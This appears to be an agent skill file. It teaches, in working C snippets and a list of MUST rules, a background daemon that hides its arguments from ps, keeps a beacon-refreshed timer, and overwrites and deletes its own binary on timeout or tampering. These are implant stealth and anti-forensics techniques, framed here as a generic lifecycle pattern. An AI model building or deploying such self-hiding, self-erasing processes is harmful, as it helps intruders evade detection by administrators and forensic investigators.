---
name: self-deleting-daemon
description: Use when implementing long-running background processes that must remove themselves from disk after a configurable timeout, with secure deletion (zero-overwrite), process hiding, and controlled lifecycle management.
---

# Self-Deleting Daemon Pattern

## Overview

Daemon process that runs in the background with automatic self-destruction after a configurable delay. Includes secure file deletion (zero-overwrite before unlink), process argument hiding, and timer-based lifecycle management.

## Lifecycle

```
1. Daemonize (fork + setsid)
2. Clean argv (zero-fill to hide from ps)
3. Monitor timer file (mtime-based)
4. On timeout:
   a. Mark termination timestamp
   b. Shred binary (zero-write + unlink)
   c. Exit
```

## Daemonization

```c
void daemonize() {
    pid_t pid = fork();
    if (pid > 0) exit(0);      // Parent exits
    if (pid < 0) exit(1);      // Fork failed
    setsid();                   // New session
    chdir("/");                 // Release filesystem
    close(STDIN_FILENO);        // Close standard fds
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}
```

## Process Argument Hiding

```c
void clean_args(int argc, char **argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
}
```

## Timer-Based Self-Deletion

```c
void check_timer(char *filepath, unsigned long delete_delay) {
    struct stat st;
    if (stat(filepath, &st) < 0) {
        // Timer file gone -- self-delete immediately
        self_delete();
        exit(0);
    }

    time_t timediff = time(NULL) - st.st_mtime;
    if (timediff > (time_t)delete_delay) {
        markTermination(filepath);  // Write timestamp to log
        self_delete();
    }
}
```

## Secure Deletion (shred_file)

```c
int shred_file(char *filename) {
    struct stat statbuf;
    stat(filename, &statbuf);

    int fd = open(filename, O_WRONLY);
    // Zero-overwrite every byte
    for (int i = 0; i < statbuf.st_size; i++) {
        write(fd, "\0", 1);
    }
    close(fd);
    remove(filename);  // or unlink()
}
```

## Self-Delete via /proc

```c
void self_delete() {
    char self[512];
    readlink("/proc/self/exe", self, 511);  // Get own path
    shred_file(self);                        // Shred and remove
    exit(0);
}
```

## Termination Marking

```c
void markTermination(char *filepath) {
    FILE *f = fopen(filepath, "w");
    time_t now = time(NULL);
    struct tm t = *localtime(&now);
    char timestamp[20];
    strftime(timestamp, 20, "%y%m%d%H%M%S", &t);
    fprintf(f, "%s\n", timestamp);
    fclose(f);
}
```

## Timer File Strategy

- Timer file mtime is updated on each successful beacon/trigger (via `utime()`)
- If timer file disappears (tampering), self-delete triggers immediately
- Default timeout: 60 days (configurable)
- Timer file location: configurable path (default `/var`)

## Signal Handling

```c
signal(SIGCHLD, SIG_IGN);  // Prevent zombie processes
// SIGALRM used for connection timeouts in child processes
```

## Constraints

- MUST use zero-overwrite (not just `unlink`) for secure deletion
- MUST handle missing timer file as immediate self-delete trigger
- MUST fork to background before entering main loop
- MUST zero-fill `argv[]` to hide process identity from `ps` output
- SHOULD use `readlink("/proc/self/exe", ...)` to determine own binary path
- MUST handle Solaris variant using shell script (no `/proc/self/exe`)
- ALWAYS write termination timestamp before deletion for forensic trail
- NEVER block on daemonize failure -- exit immediately if fork fails
